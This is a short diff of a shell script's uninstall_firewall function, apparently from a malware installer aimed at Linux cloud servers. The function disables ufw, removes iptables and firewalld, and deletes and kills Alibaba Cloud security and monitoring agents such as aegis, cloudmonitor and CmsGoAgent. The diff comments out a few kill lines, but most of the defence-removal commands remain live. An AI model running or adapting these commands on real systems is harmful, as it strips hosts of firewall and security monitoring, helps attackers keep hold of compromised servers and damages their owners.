@@ -425,20 +425,20 @@ doupdate()
 uninstall_firewall()
 {
     ufw disable
-    apt-get remove iptables -y
+    apt remove iptables -y
     chkconfig iptables off
     systemctl disable firewalld
     yum remove firewalld -y
     rm -rf /usr/local/aegis
     rm -rf /usr/local/cloudmonitor
     rm -rf /usr/sbin/aliyun-service
-    pkill wrapper.syslog.id
-    pkill wrapper
+    #pkill wrapper.syslog.id
+    #pkill wrapper
     pkill CmsGoAgent
     pkill aliyun-service
     service aegis stop
-    rm -rf /usr/bin/networkd-dispatcher
-    pkill networkd
+    #rm -rf /usr/bin/networkd-dispatcher
+    #pkill networkd
     rm -rf /etc/init.d/aegis
 }
 
